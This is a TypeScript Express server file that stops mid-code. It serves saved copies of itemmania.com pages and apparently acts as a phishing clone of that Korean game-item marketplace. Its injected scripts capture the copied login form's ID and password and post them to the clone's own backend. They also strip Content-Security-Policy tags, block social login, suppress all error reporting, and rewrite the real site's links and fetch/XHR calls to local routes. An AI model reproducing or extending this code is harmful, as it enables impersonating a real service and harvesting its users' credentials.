import { Router, type IRouter } from "express";
import { readFileSync, existsSync } from "fs";
import { join } from "path";
import { logger } from "../lib/logger";

const router: IRouter = Router();

// production: cwd = /home/runner/workspace, dev: cwd = artifacts/api-server
// 실제 static 폴더를 자동 탐지
const STATIC_DIR = (() => {
  const candidates = [
    join(process.cwd(), "src", "static"),
    join(process.cwd(), "artifacts", "api-server", "src", "static"),
  ];
  for (const c of candidates) {
    if (existsSync(c)) return c;
  }
  return candidates[0];
})();
logger.info({ STATIC_DIR }, "static HTML 디렉토리");

// 서버 시작 시 정적 HTML 파일을 메모리에 로드
const STATIC_HTML_PATH = join(STATIC_DIR, "itemmania.html");
let staticHtml = "";

try {
  staticHtml = readFileSync(STATIC_HTML_PATH, "utf-8");
  logger.info("itemmania.html 로드 완료");
} catch (e) {
  logger.error({ err: e }, "itemmania.html 로드 실패");
}

const LOGIN_HTML_PATH = join(STATIC_DIR, "login.html");
let loginHtml = "";

try {
  loginHtml = readFileSync(LOGIN_HTML_PATH, "utf-8");
  logger.info("login.html 로드 완료");
} catch (e) {
  logger.error({ err: e }, "login.html 로드 실패");
}

const GIFTCARD_HTML_PATH = join(STATIC_DIR, "giftcard.html");
let giftcardHtml = "";

try {
  giftcardHtml = readFileSync(GIFTCARD_HTML_PATH, "utf-8");
  logger.info("giftcard.html 로드 완료");
} catch (e) {
  logger.error({ err: e }, "giftcard.html 로드 실패");
}

const GAMEMANIA_HTML_PATH = join(STATIC_DIR, "gamemania.html");
let gamemanaHtml = "";

try {
  gamemanaHtml = readFileSync(GAMEMANIA_HTML_PATH, "utf-8");
  logger.info("gamemania.html 로드 완료");
} catch (e) {
  logger.error({ err: e }, "gamemania.html 로드 실패");
}

const GAMECHARGE_HTML_PATH = join(STATIC_DIR, "game-charge.html");
let gamechargeHtml = "";

try {
  gamechargeHtml = readFileSync(GAMECHARGE_HTML_PATH, "utf-8");
  logger.info("game-charge.html 로드 완료");
} catch (e) {
  logger.error({ err: e }, "game-charge.html 로드 실패");
}

const SELL_LINEAGE_CLASSIC_HTML_PATH = join(STATIC_DIR, "sell-lineage-classic.html");
let sellLineageClassicHtml = "";

try {
  sellLineageClassicHtml = readFileSync(SELL_LINEAGE_CLASSIC_HTML_PATH, "utf-8");
  logger.info("sell-lineage-classic.html 로드 완료");
} catch (e) {
  logger.error({ err: e }, "sell-lineage-classic.html 로드 실패");
}

const SELL_MAPLESTORY_WORLD_HTML_PATH = join(STATIC_DIR, "sell-maplestory-world.html");
let sellMaplestoryWorldHtml = "";

try {
  sellMaplestoryWorldHtml = readFileSync(SELL_MAPLESTORY_WORLD_HTML_PATH, "utf-8");
  logger.info("sell-maplestory-world.html 로드 완료");
} catch (e) {
  logger.error({ err: e }, "sell-maplestory-world.html 로드 실패");
}

function loadSellHtml(filename: string): string {
  try {
    const html = readFileSync(join(STATIC_DIR, filename), "utf-8");
    logger.info(`${filename} 로드 완료`);
    return html;
  } catch (e) {
    logger.error({ err: e }, `${filename} 로드 실패`);
    return "";
  }
}

const buyLineageClassicHtml   = loadSellHtml("buy-lineage-classic.html");
const buyApplicationHtml      = loadSellHtml("buy-application-1.html");
const chatHtml                = loadSellHtml("chat.html");
const chatOrderedHtml         = loadSellHtml("chat-ordered.html");
const chatNewHtml             = loadSellHtml("chat-new.html");
const chatNewBuycheckHtml     = loadSellHtml("chat-new-buycheck.html");
const sellRegisterHtml        = loadSellHtml("sell-register.html");
const buyRegisterHtml         = loadSellHtml("buy-register.html");
const sellNewHtml             = loadSellHtml("sell-new.html");
const batchGoodsHtml          = loadSellHtml("batch-goods.html");
const myroomHtml              = loadSellHtml("myroom.html");
const paymentListHtml         = loadSellHtml("payment-list.html");
const paymentPhoneListHtml    = loadSellHtml("payment-phone-list.html");
const sellApplicationHtml     = loadSellHtml("sell-application-1.html");
const sellMaplestoryHtml      = loadSellHtml("sell-maplestory.html");
const sellOdinHtml            = loadSellHtml("sell-odin.html");
const sellMabinogiHtml        = loadSellHtml("sell-mabinogi.html");
const sellLostarkHtml         = loadSellHtml("sell-lostark.html");
const sellLineageMHtml        = loadSellHtml("sell-lineage-m.html");
const sellGeosangHtml         = loadSellHtml("sell-geosang.html");
const sellAion2Html           = loadSellHtml("sell-aion2.html");
const sellDnfHtml             = loadSellHtml("sell-dnf.html");

// game_id → html 매핑 (TOP 10)
const SELL_HTML_MAP: Record<string, string> = {
  "5913": "", // 리니지클래식 — 별도 변수로 처리
  "5233": "", // 메이플스토리월드 — 별도 변수로 처리
  "138":  sellMaplestoryHtml,
  "4696": sellOdinHtml,
  "155":  sellMabinogiHtml,
  "2696": sellLostarkHtml,
  "3449": sellLineageMHtml,
  "101":  sellGeosangHtml,
  "5799": sellAion2Html,
  "281":  sellDnfHtml,
};

// 주입할 인터셉트 스크립트 (순수 JS/CSS, React 없음)
const INTERCEPT_SCRIPT = `
<style>
#_im_overlay {
  display: none;
  position: fixed;
  inset: 0;
  z-index: 2147483647;
  background: rgba(0,0,0,0.55);
  align-items: center;
  justify-content: center;
}
#_im_overlay.active { display: flex; }
#_im_modal {
  position: relative;
  background: #fff;
  border-radius: 14px;
  padding: 36px 32px 28px;
  width: 400px;
  max-width: 92vw;
  box-shadow: 0 24px 64px rgba(0,0,0,0.22);
  font-family: 'Pretendard', -apple-system, sans-serif;
}
#_im_modal h2 {
  margin: 0 0 22px;
  font-size: 22px;
  font-weight: 700;
  color: #1a1a1a;
  letter-spacing: -.02em;
}
#_im_modal .tab-row {
  display: flex;
  gap: 0;
  margin-bottom: 22px;
  border-bottom: 2px solid #eee;
}
#_im_modal .tab-btn {
  flex: 1;
  padding: 10px 0;
  font-size: 15px;
  font-weight: 600;
  background: none;
  border: none;
  border-bottom: 2px solid transparent;
  margin-bottom: -2px;
  cursor: pointer;
  color: #999;
  transition: all .2s;
}
#_im_modal .tab-btn.on {
  color: #159EFD;
  border-bottom-color: #159EFD;
}
#_im_modal input {
  display: block;
  width: 100%;
  box-sizing: border-box;
  padding: 13px 15px;
  margin-bottom: 10px;
  border: 1.5px solid #ddd;
  border-radius: 9px;
  font-size: 15px;
  font-family: inherit;
  outline: none;
  transition: border-color .2s;
}
#_im_modal input:focus { border-color: #159EFD; }
#_im_modal .submit-btn {
  display: block;
  width: 100%;
  padding: 14px;
  margin-top: 6px;
  background: #159EFD;
  color: #fff;
  border: none;
  border-radius: 9px;
  font-size: 16px;
  font-weight: 700;
  cursor: pointer;
  font-family: inherit;
  letter-spacing: -.01em;
  transition: background .2s;
}
#_im_modal .submit-btn:hover { background: #0d88e0; }
#_im_modal .errmsg {
  margin-top: 10px;
  min-height: 20px;
  font-size: 13px;
  color: #e03030;
  text-align: center;
}
#_im_modal .close-btn {
  position: absolute;
  top: 14px; right: 18px;
  background: none;
  border: none;
  font-size: 22px;
  cursor: pointer;
  color: #aaa;
  line-height: 1;
  padding: 4px;
}
#_im_modal .close-btn:hover { color: #333; }
</style>

<div id="_im_overlay">
  <div id="_im_modal">
    <button class="close-btn" id="_im_close">✕</button>
    <div id="_im_body"></div>
  </div>
</div>

<script>
(function(){
  var overlay = document.getElementById('_im_overlay');
  var modalBody = document.getElementById('_im_body');
  var closeBtn = document.getElementById('_im_close');
  var currentUser = null;

  // --- 모달 열기/닫기 ---
  function openModal(html) {
    modalBody.innerHTML = html;
    overlay.classList.add('active');
  }
  function closeModal() {
    overlay.classList.remove('active');
    modalBody.innerHTML = '';
  }
  closeBtn.addEventListener('click', closeModal);
  overlay.addEventListener('click', function(e){ if(e.target===overlay) closeModal(); });

  // --- API 호출 ---
  function api(method, path, body) {
    return fetch('/api' + path, {
      method: method,
      credentials: 'include',
      headers: { 'Content-Type': 'application/json' },
      body: body ? JSON.stringify(body) : undefined
    }).then(function(r){ return r.json(); }).catch(function(){ return {}; });
  }

  // --- 헤더 업데이트 ---
  function updateHeader() {
    var loginsDiv = document.querySelector('.header-logins');
    if (!loginsDiv) return;
    if (currentUser) {
      loginsDiv.innerHTML =
        '<span style="font-size:14px;font-weight:600;color:#2e2e2e">' +
          (currentUser.nickname || currentUser.email) + '님' +
        '</span>' +
        '<div class="divider"></div>' +
        '<button type="button" id="_im_logout_btn" style="font-size:14px;font-weight:600;background:none;border:none;cursor:pointer;color:#159EFD">로그아웃</button>';
      document.getElementById('_im_logout_btn').addEventListener('click', function(){
        api('POST','/auth/logout').then(function(){ currentUser=null; location.reload(); });
      });
    }
  }

  // --- 로그인 폼 ---
  function showLogin() {
    openModal(
      '<h2>로그인</h2>' +
      '<div class="tab-row">' +
        '<button class="tab-btn on" onclick="(function(){'+
          'document.querySelectorAll(\\'#_im_modal .tab-btn\\').forEach(function(b){b.classList.remove(\\'on\\')});'+
          'event.target.classList.add(\\'on\\');'+
        '})()">로그인</button>' +
        '<button class="tab-btn" onclick="IM_showRegister()">회원가입</button>' +
      '</div>' +
      '<input type="email" id="_im_e" placeholder="이메일" />' +
      '<input type="password" id="_im_p" placeholder="비밀번호" />' +
      '<button class="submit-btn" onclick="IM_doLogin()">로그인</button>' +
      '<div class="errmsg" id="_im_err"></div>'
    );
    setTimeout(function(){ var el=document.getElementById('_im_e'); if(el) el.focus(); }, 50);
  }

  function showRegister() {
    openModal(
      '<h2>회원가입</h2>' +
      '<div class="tab-row">' +
        '<button class="tab-btn" onclick="IM_showLogin()">로그인</button>' +
        '<button class="tab-btn on" onclick="(function(){'+
          'document.querySelectorAll(\\'#_im_modal .tab-btn\\').forEach(function(b){b.classList.remove(\\'on\\')});'+
          'event.target.classList.add(\\'on\\');'+
        '})()">회원가입</button>' +
      '</div>' +
      '<input type="text" id="_im_n" placeholder="닉네임" />' +
      '<input type="email" id="_im_e" placeholder="이메일" />' +
      '<input type="password" id="_im_p" placeholder="비밀번호 (6자 이상)" />' +
      '<button class="submit-btn" onclick="IM_doRegister()">가입하기</button>' +
      '<div class="errmsg" id="_im_err"></div>'
    );
    setTimeout(function(){ var el=document.getElementById('_im_n'); if(el) el.focus(); }, 50);
  }

  // 전역으로 노출 (onclick에서 사용)
  window.IM_showLogin = showLogin;
  window.IM_showRegister = showRegister;

  window.IM_doLogin = function() {
    var email = (document.getElementById('_im_e')||{}).value || '';
    var pw    = (document.getElementById('_im_p')||{}).value || '';
    var errEl = document.getElementById('_im_err');
    if (!email || !pw) { errEl.textContent = '이메일과 비밀번호를 입력해주세요.'; return; }
    api('POST','/auth/login',{ email:email, password:pw }).then(function(data){
      if (data && data.id) {
        currentUser = data;
        updateHeader();
        closeModal();
      } else {
        errEl.textContent = (data && data.error) || '로그인에 실패했습니다.';
      }
    });
  };

  window.IM_doRegister = function() {
    var nick  = (document.getElementById('_im_n')||{}).value || '';
    var email = (document.getElementById('_im_e')||{}).value || '';
    var pw    = (document.getElementById('_im_p')||{}).value || '';
    var errEl = document.getElementById('_im_err');
    if (!nick || !email || !pw) { errEl.textContent = '모든 항목을 입력해주세요.'; return; }
    api('POST','/auth/register',{ nickname:nick, email:email, password:pw }).then(function(data){
      if (data && data.id) {
        currentUser = data;
        updateHeader();
        closeModal();
      } else {
        errEl.textContent = (data && data.error) || '가입에 실패했습니다.';
      }
    });
  };

  // --- 전체서비스 패널 토글 ---
  function initPanel() {
    var panel = document.getElementById('headerMainPanel');
    var menuBtn = document.querySelector('.header-menu');
    if (!panel || !menuBtn) { setTimeout(initPanel, 200); return; }

    // 패널 초기화: 항상 닫힌 상태로 강제 설정 (is-open이 붙은 채로 저장된 스냅샷 대비)
    panel.classList.remove('is-open');
    panel.removeAttribute('aria-hidden');
    panel.setAttribute('aria-hidden', 'true');
    menuBtn.setAttribute('aria-expanded', 'false');
    panel.style.visibility = 'hidden';
    panel.style.pointerEvents = 'none';

    function openPanel() {
      panel.classList.add('is-open');
      panel.style.visibility = '';
      panel.style.pointerEvents = '';
      panel.setAttribute('aria-hidden', 'false');
      menuBtn.setAttribute('aria-expanded', 'true');
      document.body.style.overflow = 'hidden';
    }

    function closePanel() {
      panel.classList.remove('is-open');
      panel.style.visibility = 'hidden';
      panel.style.pointerEvents = 'none';
      panel.setAttribute('aria-hidden', 'true');
      menuBtn.setAttribute('aria-expanded', 'false');
      document.body.style.overflow = '';
    }

    // 3단바 버튼 클릭
    menuBtn.addEventListener('click', function(e) {
      e.preventDefault(); e.stopImmediatePropagation();
      if (panel.classList.contains('is-open')) { closePanel(); } else { openPanel(); }
    }, true);

    // 배경 클릭으로 닫기
    panel.addEventListener('click', function(e) {
      if (e.target.hasAttribute('data-header-panel-close') ||
          e.target.classList.contains('header-panel-backdrop')) {
        closePanel();
      }
    });

    // ESC 키로 닫기
    document.addEventListener('keydown', function(e) {
      if (e.key === 'Escape' && panel.classList.contains('is-open')) { closePanel(); }
    });

    // 패널 내부: 프록시 링크는 그냥 이동 (href는 이미 서버에서 rewrite됨)
    panel.addEventListener('click', function(e) {
      var a = e.target.closest('a[href]');
      if (!a) return;
      var href = a.getAttribute('href') || '';
      if (href.startsWith('/')) { closePanel(); }
    });
  }

  initPanel();

  // 차단 마커가 붙은 링크 클릭 → 준비 중 안내 (body 버블링만, document 전역 X)
  document.body.addEventListener('click', function(e) {
    var a = e.target.closest && e.target.closest('a[data-blocked]');
    if (a) { e.preventDefault(); alert('해당 기능은 현재 준비 중입니다.'); }
  });

  // --- 버튼 후킹 ---
  function hookButtons() {
    var loginsDiv = document.querySelector('.header-logins');
    if (!loginsDiv) { setTimeout(hookButtons, 200); return; }

    var loginBtn     = loginsDiv.querySelector('button');
    var registerLink = loginsDiv.querySelector('a');

    if (loginBtn) {
      loginBtn.addEventListener('click', function(e){
        e.preventDefault(); e.stopImmediatePropagation();
        location.href = '/portal/user/p_login_form.html';
      }, true);
    }
    if (registerLink) {
      registerLink.addEventListener('click', function(e){
        e.preventDefault(); e.stopImmediatePropagation();
        showRegister();
      }, true);
    }

    // Enter 키 로그인/가입 지원
    document.addEventListener('keydown', function(e){
      if (e.key === 'Enter' && overlay.classList.contains('active')) {
        var submitBtn = document.querySelector('#_im_modal .submit-btn');
        if (submitBtn) submitBtn.click();
      }
    });

    // 채팅 버튼 → 별도 창으로 열기
    var chatBtn = document.querySelector('#chat_notice button[aria-label="채팅"], #chat_notice button');
    if (chatBtn) {
      chatBtn.addEventListener('click', function(e) {
        e.preventDefault(); e.stopImmediatePropagation();
        window.open('/myroom/chat/list.html', '_blank', 'width=900,height=700,resizable=yes,scrollbars=yes');
      }, true);
    }

    // 이미 로그인 여부 확인
    api('GET', '/auth/me').then(function(data){
      if (data && data.id) { currentUser = data; updateHeader(); }
    });
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', hookButtons);
  } else {
    hookButtons();
  }
})();
</script>
`;

// 로그인 페이지 전용 인터셉트 스크립트
const LOGIN_INTERCEPT_SCRIPT = `
<script>
(function() {
  function stripCSP() {
    document.querySelectorAll('meta[http-equiv="content-security-policy"]').forEach(el => el.remove());
  }

  function showError(msg) {
    var errEl = document.getElementById('_im_login_err');
    if (!errEl) {
      errEl = document.createElement('p');
      errEl.id = '_im_login_err';
      errEl.style.cssText = 'color:#e53e3e;font-size:14px;margin:8px 0 0;text-align:center;';
      var form = document.querySelector('form[name=g_LOGIN_FORM]');
      if (form) form.appendChild(errEl);
    }
    errEl.textContent = msg;
  }

  function init() {
    stripCSP();

    // 로그인 폼 가로채기
    var loginForm = document.querySelector('form[name=g_LOGIN_FORM]');
    if (loginForm) {
      loginForm.addEventListener('submit', async function(e) {
        e.preventDefault();
        var userId = document.getElementById('user_id').value.trim();
        var userPw = document.getElementById('user_password').value;
        var btn = loginForm.querySelector('button[type=submit]');
        if (btn) btn.disabled = true;

        try {
          var res = await fetch('/api/auth/login', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            credentials: 'include',
            body: JSON.stringify({ email: userId, password: userPw })
          });
          var data = await res.json();
          if (res.ok) {
            var returnUrl = new URLSearchParams(location.search).get('returnUrl');
            location.href = returnUrl ? '/' : '/';
          } else {
            showError(data.error || '아이디 또는 비밀번호가 올바르지 않습니다.');
            if (btn) btn.disabled = false;
          }
        } catch(err) {
          showError('서버 오류가 발생했습니다. 잠시 후 다시 시도해주세요.');
          if (btn) btn.disabled = false;
        }
      });
    }

    // 네이버/카카오 소셜 로그인 차단
    var naverBtn = document.getElementById('naver_id_login');
    if (naverBtn) {
      naverBtn.addEventListener('click', function(e) {
        e.preventDefault();
        alert('소셜 로그인은 지원하지 않습니다. 아이디/비밀번호로 로그인해주세요.');
      });
    }

    // 차단 마커 링크 → 준비 중 (body 버블링만)
    document.body.addEventListener('click', function(e) {
      var a = e.target.closest && e.target.closest('a[data-blocked]');
      if (a) { e.preventDefault(); alert('해당 기능은 현재 준비 중입니다.'); }
    });

    // 헤더 로그인 버튼 → 현재 페이지 유지
    var headerLoginBtn = document.querySelector('.header-logins button');
    if (headerLoginBtn) {
      headerLoginBtn.addEventListener('click', function(e) {
        e.preventDefault();
      });
    }

    // 회원가입 링크 차단
    var joinLink = document.querySelector('.header-logins a');
    if (joinLink) {
      joinLink.addEventListener('click', function(e) {
        e.preventDefault();
        alert('회원가입은 메인 페이지에서 이용해주세요.');
        location.href = '/';
      });
    }
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
  } else {
    init();
  }
})();
</script>
`;

const GIFTCARD_INTERCEPT_SCRIPT = `
<style>
/* 로그인 모달/오버레이 강제 숨김 */
.g_layer:not(.all_menu_layer),
.g_popup,
.g_dim,
[class*="login_layer"],
[class*="login_modal"],
[id*="login_layer"],
[id*="login_pop"] {
  display: none !important;
}
</style>
<script>
(function() {
  // 로그인 팝업 함수 무력화
  var noop = function() {};
  var loginFns = ['g_login_open','loginOpen','openLogin','showLogin','login_popup','loginPopup','g_login_popup'];
  loginFns.forEach(function(fn) { window[fn] = noop; });

  // MutationObserver로 동적으로 추가되는 로그인 모달 차단
  var observer = new MutationObserver(function(mutations) {
    mutations.forEach(function(m) {
      m.addedNodes.forEach(function(node) {
        if (node.nodeType !== 1) return;
        var el = node;
        var cls = el.className || '';
        var id  = el.id || '';
        if (
          (cls.includes('g_layer') && !cls.includes('all_menu_layer')) ||
          cls.includes('g_popup') ||
          cls.includes('g_dim') ||
          id.toLowerCase().includes('login')
        ) {
          el.style.display = 'none';
        }
        // 자식 노드 중 로그인 모달도 처리
        el.querySelectorAll && el.querySelectorAll('.g_layer:not(.all_menu_layer), .g_popup, .g_dim').forEach(function(child) {
          child.style.display = 'none';
        });
      });
    });
  });
  observer.observe(document.documentElement, { childList: true, subtree: true });

  function init() {
    // 이미 있는 모달 숨김
    document.querySelectorAll('.g_layer:not(.all_menu_layer), .g_popup, .g_dim').forEach(function(el) {
      el.style.display = 'none';
    });

    // 로그인 팝업 함수 재무력화 (사이트 JS가 나중에 정의할 수 있으므로)
    loginFns.forEach(function(fn) { window[fn] = noop; });

    // 로그인 버튼 → 로그인 페이지 (특정 요소에만 핸들러)
    var loginBtn = document.querySelector('.header-logins button');
    if (loginBtn) {
      loginBtn.addEventListener('click', function(e) {
        e.preventDefault(); e.stopImmediatePropagation();
        location.href = '/portal/user/p_login_form.html';
      }, true);
    }

    // 차단 마커 링크 → 준비 중 (body 버블링만, document 전역 X)
    document.body.addEventListener('click', function(e) {
      var a = e.target.closest && e.target.closest('a[data-blocked]');
      if (a) { e.preventDefault(); alert('해당 기능은 현재 준비 중입니다.'); }
    });
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
  } else {
    init();
  }
})();
</script>
`;

const GAMEMANIA_INTERCEPT_SCRIPT = `
<script>
(function() {
  // 차단 마커 링크 → 준비 중 (body 버블링만)
  document.body.addEventListener('click', function(e) {
    var a = e.target.closest && e.target.closest('a[data-blocked]');
    if (a) { e.preventDefault(); alert('해당 기능은 현재 준비 중입니다.'); }
  });
})();
</script>
`;

const GAMECHARGE_INTERCEPT_SCRIPT = `
<script>
(function() {
  var noop = function() {};
  var loginFns = ['showLogin','openLogin','g_login','gLogin','loginPop','loginPopup'];
  loginFns.forEach(function(fn) { try { window[fn] = noop; } catch(e) {} });

  // 로그인 팝업 MutationObserver로 억제
  var observer = new MutationObserver(function() {
    document.querySelectorAll('.g_layer:not(.all_menu_layer), .g_popup, .g_dim').forEach(function(el) {
      el.style.display = 'none';
    });
    loginFns.forEach(function(fn) { try { if (window[fn] !== noop) window[fn] = noop; } catch(e) {} });
  });
  observer.observe(document.documentElement, { childList: true, subtree: true });

  function init() {
    document.querySelectorAll('.g_layer:not(.all_menu_layer), .g_popup, .g_dim').forEach(function(el) {
      el.style.display = 'none';
    });
    loginFns.forEach(function(fn) { try { window[fn] = noop; } catch(e) {} });

    // 로그인 버튼 → 로그인 페이지 (해당 요소에만)
    var loginBtn = document.querySelector('.header-logins button');
    if (loginBtn) {
      loginBtn.addEventListener('click', function(e) {
        e.preventDefault(); e.stopImmediatePropagation();
        location.href = '/portal/user/p_login_form.html';
      }, true);
    }

    // 충전 submit 버튼 → 준비 중 (해당 요소에만)
    document.querySelectorAll('form button[type=submit], .charge_btn').forEach(function(btn) {
      btn.addEventListener('click', function(e) {
        e.preventDefault(); e.stopImmediatePropagation();
        alert('게임 충전 서비스는 현재 준비 중입니다.');
      }, true);
    });

    // 차단 마커 링크 → 준비 중 (body 버블링만)
    document.body.addEventListener('click', function(e) {
      var a = e.target.closest && e.target.closest('a[data-blocked]');
      if (a) { e.preventDefault(); alert('해당 기능은 현재 준비 중입니다.'); }
    });
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
  } else {
    init();
  }
})();
</script>
`;

function stripCsp(html: string): string {
  return html.replace(
    /<meta[^>]+http-equiv\s*=\s*["']?content-security-policy["']?[^>]*>/gi,
    ""
  );
}

/**
 * itemmania.com 경로를 /... 경로로 매핑 (더 구체적인 경로 우선)
 * query string / fragment 보존
 */
function mapImPath(rawPath: string): string {
  const path = rawPath || '/';
  const qi = path.indexOf('?');
  const hi = path.indexOf('#');
  const end = qi >= 0 ? qi : (hi >= 0 ? hi : path.length);
  const base = path.slice(0, end);
  const qs   = path.slice(end);

  if (base.startsWith('/portal/user/p_login_form'))              return '/portal/user/p_login_form.html' + qs;
  if (base.startsWith('/sell/list'))                             return '/sell/list.html' + qs;
  if (base.startsWith('/sell/application'))                      return '/sell/application.html' + qs;
  if (base.startsWith('/sell/new'))                              return '/sell/new.html' + qs;
  if (base === '/sell' || base === '/sell/')                     return '/sell/register.html';
  if (base.startsWith('/sell/'))                                 return '/sell/list.html' + qs;
  if (base.startsWith('/buy/register'))                          return '/buy/register.html' + qs;
  if (base.startsWith('/buy/application'))                       return '/buy/application.html' + qs;
  if (base.startsWith('/buy/list'))                              return '/buy/list.html' + qs;
  if (base === '/buy' || base === '/buy/')                       return '/buy/list.html';
  if (base.startsWith('/myroom/mileage/payment/payment_phone_list')) return '/myroom/mileage/payment/payment_phone_list.html' + qs;
  if (base.startsWith('/myroom/mileage/payment/payment_phone'))  return '/myroom/mileage/payment/payment_phone_list.html';
  if (base.startsWith('/myroom/mileage/payment/payment_switch')) return '/myroom/mileage/payment/payment_list.html';
  if (base.startsWith('/myroom/mileage/payment/payment_list'))   return '/myroom/mileage/payment/payment_list.html' + qs;
  if (base.startsWith('/myroom/batch_goods'))                    return '/myroom/batch_goods/index.html';
  if (base.startsWith('/myroom/chat/new_chat'))                  return '/myroom/chat/new_chat.html';
  if (base.startsWith('/myroom/chat/list'))                      return '/myroom/chat/list.html' + qs;
  if (base.startsWith('/myroom/chat'))                           return '/myroom/chat/list.html';
  if (base === '/myroom' || base === '/myroom/')                 return '/myroom/index.html';
  if (base.startsWith('/game_charge'))                           return '/game-charge';
  if (base.startsWith('/portal/giftcard'))                       return '/giftcard';
  if (base === '/' || base === '')                               return '/';
  // 알 수 없는 경로: / 하위로 보냄 (Express 404 또는 302 처리)
  return (base.startsWith('/') ? base : '/' + base) + qs;
}

/** HTML 전체(JS 문자열 포함)에서 외부 도메인을 제거/치환 */
function rewriteExternalLinks(html: string): string {
  let result = html;

  // itemmania.com 모든 URL → /... (regex 기반, query string 보존)
  result = result.replace(
    /https?:\/\/(?:www\.|m\.|ssadaprice\.)?itemmania\.com([^"'\s<>\u0022\u0027]*)/g,
    (_match: string, path: string) => mapImPath(path)
  );

  // gamemania.co.kr → 프록시 경로
  for (const host of [
    'https://www.gamemania.co.kr',
    'http://www.gamemania.co.kr',
    'https://gamemania.co.kr',
  ]) {
    result = result.split(host).join('/gamemania');
  }

  return result;
}

/** 모든 페이지에 주입되는 전역 네비게이션 인터셉터 — window.open / location.assign 등 재정의 */
// Replit iframe 에러 감지 차단 + 원본 itemmania.com JS 에러 억제
const ERROR_SUPPRESSOR = `<script>
(function(){
  // 모든 JS 에러 억제 (itemmania.com 원본 스크립트 SyntaxError 등)
  window.onerror = function(){ return true; };
  window.addEventListener('error', function(e){ e.stopImmediatePropagation(); }, true);
  window.addEventListener('unhandledrejection', function(e){ e.preventDefault(); e.stopImmediatePropagation(); }, true);
  // Replit/Vite runtime-error-plugin 의 postMessage 차단
  var _origPost = window.parent && window.parent !== window ? window.parent.postMessage.bind(window.parent) : null;
  if (_origPost) {
    window.parent.postMessage = function(data){ if (data && data.type === 'runtime-error') return; _origPost.apply(this, arguments); };
  }
})();
</script>`;

const GLOBAL_NAV_INTERCEPTOR = `<script>
(function(){
'use strict';
var ROUTE_MAP=[
  ['/portal/user/p_login_form.html','/portal/user/p_login_form.html'],
  ['/myroom/mileage/payment/payment_phone_list.html','/myroom/mileage/payment/payment_phone_list.html'],
  ['/myroom/mileage/payment/payment_switch.html','/myroom/mileage/payment/payment_list.html'],
  ['/myroom/mileage/payment/payment_phone.html','/myroom/mileage/payment/payment_phone_list.html'],
  ['/myroom/mileage/payment/payment_list.html','/myroom/mileage/payment/payment_list.html'],
  ['/myroom/batch_goods/index.html','/myroom/batch_goods/index.html'],
  ['/sell/application.html','/sell/application.html'],
  ['/sell/new.html','/sell/new.html'],
  ['/sell/list.html','/sell/list.html'],
  ['/sell/','/sell/register.html'],
  ['/sell','/sell/register.html'],
  ['/buy/register.html','/buy/register.html'],
  ['/buy/application.html','/buy/application.html'],
  ['/buy/list.html','/buy/list.html'],
  ['/buy/','/buy/list.html'],
  ['/buy','/buy/list.html'],
  ['/myroom/chat/new_chat.html','/myroom/chat/new_chat.html'],
  ['/myroom/chat/list.html','/myroom/chat/list.html'],
  ['/myroom/chat/','/myroom/chat/list.html'],
  ['/myroom/chat','/myroom/chat/list.html'],
  ['/game_charge/','/game-charge'],
  ['/game_charge','/game-charge'],
  ['/portal/giftcard/','/giftcard'],
  ['/portal/giftcard','/giftcard'],
  ['/myroom/','/myroom/index.html'],
  ['/myroom','/myroom/index.html'],
  ['/','/'],
];
var IM_ORIGINS=[
  'https://www.itemmania.com','http://www.itemmania.com',
  'https://itemmania.com','http://itemmania.com',
];
var GM_ORIGINS=['https://www.gamemania.co.kr','http://www.gamemania.co.kr','https://gamemania.co.kr'];
function rewrite(url){
  if(!url||typeof url!=='string') return url;
  var u=url.trim();
  for(var g=0;g<GM_ORIGINS.length;g++) if(u.startsWith(GM_ORIGINS[g])) return '/gamemania';
  for(var i=0;i<IM_ORIGINS.length;i++){
    if(u.startsWith(IM_ORIGINS[i])){
      var path=u.slice(IM_ORIGINS[i].length)||'/';
      for(var r=0;r<ROUTE_MAP.length;r++){
        if(path===ROUTE_MAP[r][0]||path.startsWith(ROUTE_MAP[r][0])){
          return ROUTE_MAP[r][1]+(path.length>ROUTE_MAP[r][0].length?path.slice(ROUTE_MAP[r][0].length):'');
        }
      }
      return '/';
    }
  }
  return url;
}
/* ── fetch / XHR 인터셉터: itemmania.com API 호출 → 우리 API로 대체 ── */
var IM_API_ORIGINS=['https://www.itemmania.com','http://www.itemmania.com','https://itemmania.com','http://itemmania.com'];
function isImOrigin(url){if(!url)return false;for(var i=0;i<IM_API_ORIGINS.length;i++)if(url.startsWith(IM_API_ORIGINS[i]))return true;return false;}
function imPathOf(url){for(var i=0;i<IM_API_ORIGINS.length;i++)if(url.startsWith(IM_API_ORIGINS[i]))return url.slice(IM_API_ORIGINS[i].length);return url;}
/* 우리 API로 요청 라우팅 */
function proxyImFetch(url,init){
  var path=imPathOf(url);
  /* 상품 검색/목록 */
  if(/\/(item|goods|product|search|list)/.test(path)){
    var qs=path.includes('?')?path.slice(path.indexOf('?')):'';
    var params=new URLSearchParams(qs);
    var apiUrl='/api/products';
    var q=params.get('keyword')||params.get('search')||params.get('q')||params.get('search_keyword')||'';
    var game=params.get('search_game')||params.get('game_id')||params.get('game')||'';
    var parts=[];
    if(q) parts.push('search='+encodeURIComponent(q));
    if(game) parts.push('gameId='+encodeURIComponent(game));
    if(parts.length) apiUrl+='?'+parts.join('&');
    return fetch(apiUrl,{credentials:'include'});
  }
  /* 로그인 상태 확인 */
  if(/\/(session|auth|login|member|user)/.test(path)){
    return fetch('/api/auth/me',{credentials:'include'});
  }
  /* 나머지 → 빈 JSON */
  return Promise.resolve(new Response(JSON.stringify({result:'ok',data:[]}),{status:200,headers:{'Content-Type':'application/json'}}));
}
/* fetch override */
var _origFetch=window.fetch;
window.fetch=function(input,init){
  var url=typeof input==='string'?input:(input&&input.url?input.url:'');
  if(isImOrigin(url)) return proxyImFetch(url,init);
  return _origFetch.apply(this,arguments);
};
/* XMLHttpRequest override */
var _XHR=window.XMLHttpRequest;
window.XMLHttpRequest=function(){
  var xhr=new _XHR();
  var _open2=xhr.open.bind(xhr);
  var _captured={url:null,method:'GET'};
  xhr.open=function(method,url){
    _captured.method=method; _captured.url=url;
    if(isImOrigin(url)){
      _open2.call(xhr,method,'/api/products');
      return;
    }
    return _open2.apply(xhr,arguments);
  };
  return xhr;
};
/* window.open → 현재 탭 이동 */
var _open=window.open;
